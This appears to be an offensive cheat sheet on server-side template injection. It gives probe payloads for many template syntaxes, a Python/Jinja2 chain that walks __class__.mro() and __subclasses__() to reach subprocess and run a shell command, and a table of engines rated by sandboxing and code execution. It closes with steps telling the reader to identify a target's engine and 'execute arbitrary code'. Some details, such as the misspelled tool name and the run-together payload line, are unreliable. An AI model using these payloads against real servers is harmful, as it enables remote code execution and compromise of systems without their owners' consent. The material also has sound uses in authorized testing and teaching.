
---

### **Template Injection & Exploitation**

#### **1. Template Injection Payloads**
- **Common Payloads**:
  ```bash
  {{7*7}}, ${7*7},<%= 7*7 %>,#{{7*7}}{7*7}*{7*7}{{7*7}}[[7*7]]${7*7}@(7*7)<?=7*7?><%= 7*7 %>${= 7*7}{{= 7*7}}${{7*7}}#{7*7}[=7*7]
  ```

#### **2. Identify Target Language & Libraries**
1. **Programming Language**:
   - Determine the programming language used by the target (e.g., Python, Java, Ruby).

2. **Libraries**:
   - Identify the libraries or frameworks used (e.g., Jinja2, Twig, Django).

3. **Discovery**:
   - Use various payloads to test and identify the template engine.

#### **3. Research & Tools**
- **Medium**: Check Medium articles for template injection techniques.
- **GitHub**: Search for repositories related to template injection.
- **HackTricks**: Refer to HackTricks for detailed exploitation methods.
- **Tblmap Tool**: Use Tblmap for automated template injection testing.

#### **4. Python Template Injection**
- **Class Identification**:
  ```bash
  {{''.__class__}}
  ```
- **Method Resolution Order (MRO)**:
  ```bash
  {{''.__class__.mro()}}
  ```
- **Subprocess Execution**:
  ```bash
  {{''.__class__.mro()[2].__subclasses__()[233]("uname -a", shell=True, stdout=-1).communicate()}}
  ```

#### **5. Template Engines & Security Features**
- **Jinja2**: Introspection, no sandbox.
- **Django**: Tag code execution, no sandbox.
- **Twig**: Introspection, sandbox.
- **Smarty (PHP)**: Tag code execution, sandbox.
- **Handlebars**: Introspection, tag code execution.
- **Nunjucks**: Introspection, no sandbox.
- **Vue**: Introspection, no sandbox.
- **JavaScript (Dust)**: Bug, local code execution.
- **ERB (Ruby)**: Direct code execution.
- **Razor (.NET)**: Direct code execution.
- **ASP**: Direct code execution.

---

### **How to Use This Information**
1. **Payload Testing**:
   - Use the provided payloads to test for template injection vulnerabilities.

2. **Language & Library Identification**:
   - Identify the programming language and libraries used by the target.

3. **Exploitation**:
   - Use the identified template engine to execute arbitrary code.

4. **Automation**:
   - Utilize tools like Tblmap for automated testing and exploitation.

5. **Research**:
   - Refer to Medium, GitHub, and HackTricks for additional techniques and payloads.

---
